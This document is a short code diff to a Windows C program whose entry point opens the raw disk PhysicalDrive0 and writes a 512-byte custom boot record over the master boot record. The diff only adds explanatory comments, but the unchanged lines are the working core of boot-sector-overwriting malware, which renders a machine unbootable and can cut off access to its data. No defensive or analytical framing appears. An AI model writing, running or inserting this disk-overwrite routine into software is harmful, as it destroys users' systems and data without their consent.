@@ -12,12 +12,14 @@ int CALLBACK WinMain(
     LPSTR     lpCmdLine, int       nCmdShow
 )
 {
+    // just open a handle to PhysicalDrive0, and we write our custom bootloader
+    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
         L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
         FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
         OPEN_EXISTING, 0, 0);
 
-    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
-    CloseHandle(hDevice);
+    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); // write the file to the handle
+    CloseHandle(hDevice); // close the handle
 }
